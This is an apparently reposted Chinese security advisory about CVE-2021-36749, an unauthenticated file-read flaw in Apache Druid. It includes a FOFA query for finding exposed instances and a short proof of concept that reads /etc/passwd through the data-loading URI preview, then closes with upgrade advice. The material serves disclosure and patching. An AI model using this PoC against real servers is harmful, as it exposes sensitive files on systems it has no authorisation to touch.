<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/NpwSf-QnTgUFOWEkbOYKMw)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/I1c6evzliamJfg5jp48H0UBqPy2Jbkib6vtYhIPStgZIDDFmufnQNiaEE5dobjCibhejjkYxTJom1kibwa9OKSW3NicA/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

0x00 漏洞描述
---------

*   Apache Druid 是一款使用 Java 语言编写的、面向列的开源分布式数据库。该漏洞是由于用户指定 HTTP InputSource 没有做出限制，可以通过将文件 URL 传递给 HTTP InputSource 来绕过应用程序级别的限制。成功利用此漏洞的攻击者在未授权的情况下，通过构造恶意请求执行文件读取，最终造成服务器敏感性信息泄露。
    

0x01 危害等级类型
-----------

*   中危
    
*   文件读取
    

0x02 影响版本及编号  

---------------

*   CVE-2021-36749
    

0x03 漏洞复现
---------

```
fofa语句：title="Apache Druid"  

```

```
`POC：file:///etc/passwd``file协议读取路径：Load data –HTTP(s)–Connect Data–URIs-preview  
`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

0x04 修复建议  

------------

*   Apache官方已发布修复版本，尽快升级到最新版本的 Apache Druid，可从官网获得。
    
*   https://druid.apache.org/
    

关注及时推送最新安全威胁资讯！
---------------

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**「由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失,均由使用者本人负责，EXP 与 POC 仅仅只供对已授权的目标使用测试，对未授权目标的测试本文库不承担责任，均由本人自行承担。本文库中的漏洞均为公开的漏洞收集，若文库中的漏洞出现敏感内容产生了部分影响，请及时联系作者删除漏洞，望师傅们谅解」**